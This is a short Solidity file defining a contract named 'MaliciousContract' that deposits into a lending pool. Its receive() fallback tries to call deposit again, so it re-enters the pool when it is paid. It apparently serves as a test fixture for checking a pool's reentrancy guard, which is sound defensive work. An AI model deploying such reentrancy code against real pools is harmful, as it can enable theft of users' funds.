// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

contract MaliciousContract {
    address public lendPool;
    address public asset;
    uint256 public amount;
    
    constructor(
        address _lendPool,
        address _asset,
        uint256 _amount
    ) {
        lendPool = _lendPool;
        asset = _asset;
        amount = _amount;
    }
    
    function attack() external {
        ILendPool(lendPool).deposit(asset, amount, address(this));
    }
    
    receive() external payable {
        // Attempt to reenter
        ILendPool(lendPool).deposit(asset, amount, address(this));
    }
}